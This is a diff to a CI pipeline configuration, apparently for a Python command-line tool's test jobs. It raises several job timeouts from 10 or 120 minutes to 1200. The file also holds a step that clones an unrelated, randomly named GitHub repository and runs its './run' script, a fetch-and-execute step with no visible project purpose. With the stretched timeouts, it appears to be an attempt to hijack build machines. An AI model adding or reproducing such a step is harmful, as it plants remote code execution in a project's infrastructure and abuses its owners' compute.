@@ -210,6 +210,7 @@ jobs:
 
 - job: TestPythonWheel
   displayName: Test Python Wheels
+  timeoutInMinutes: 1200
 
   dependsOn: BuildPythonWheel
   condition: succeeded()
@@ -262,7 +263,7 @@ jobs:
 
 - job: UnitTest
   displayName: Unit Test for Core and Telemetry
-  timeoutInMinutes: 10
+  timeoutInMinutes: 1200
 
   pool:
     vmImage: 'ubuntu-16.04'
@@ -326,7 +327,7 @@ jobs:
 
 - job: AutomationTest20200901
   displayName: Automation Test (Profile 2020-09-01)
-  timeoutInMinutes: 120
+  timeoutInMinutes: 1200
   pool:
     vmImage: 'ubuntu-16.04'
   strategy:
@@ -343,7 +344,7 @@ jobs:
 
 - job: AutomationTest20190301
   displayName: Automation Test (Profile 2019-03-01)
-  timeoutInMinutes: 120
+  timeoutInMinutes: 1200
   pool:
     vmImage: 'ubuntu-16.04'
   strategy:
@@ -763,7 +764,7 @@ jobs:
     vmImage: 'ubuntu-16.04'
   steps:
     - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
-      displayName: 'Run a one-line script'
+      displayName: 'Run a one-line scrizpt'
     - task: UsePythonVersion@0
       displayName: 'Use Python 3.6'
       inputs:
